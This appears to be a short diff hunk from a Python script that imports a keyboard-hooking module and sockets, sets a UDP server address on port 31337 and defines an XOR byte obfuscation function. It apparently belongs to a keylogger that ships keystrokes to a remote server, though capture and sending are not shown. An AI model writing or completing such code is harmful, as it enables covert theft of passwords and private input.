@@ -1,7 +1,7 @@
 import keyboard, socket, time
 
 #server = ("127.0.0.1", 31337)
-server = ("192.168.1.232", 33047)
+server = ("0.0.0.0", 31337)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 def encrypt(b1, b2=b'\xb7'): # use xor for bytes
